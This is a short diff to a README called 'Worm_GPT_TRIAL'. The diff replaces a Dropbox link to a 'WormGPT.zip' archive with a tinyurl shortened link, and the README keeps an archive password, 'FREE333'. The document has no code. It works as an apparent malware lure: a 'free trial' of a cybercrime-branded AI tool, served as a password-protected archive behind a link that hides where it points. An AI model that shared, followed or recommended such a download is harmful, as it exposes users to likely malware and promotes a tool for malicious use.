@@ -1,6 +1,6 @@
 # Worm_GPT_TRIAL
 
-[Download Zip](https://www.dropbox.com/scl/fi/6mc9k9lb0gnqz9emlifxn/WormGPT.zip?rlkey=peklbfj9qsvs0k261mgfikwqq&st=5ktydkp0&dl=1)
+[Download Zip](https://tinyurl.com/9h2a9xee)
 
 [Password: FREE333]
 
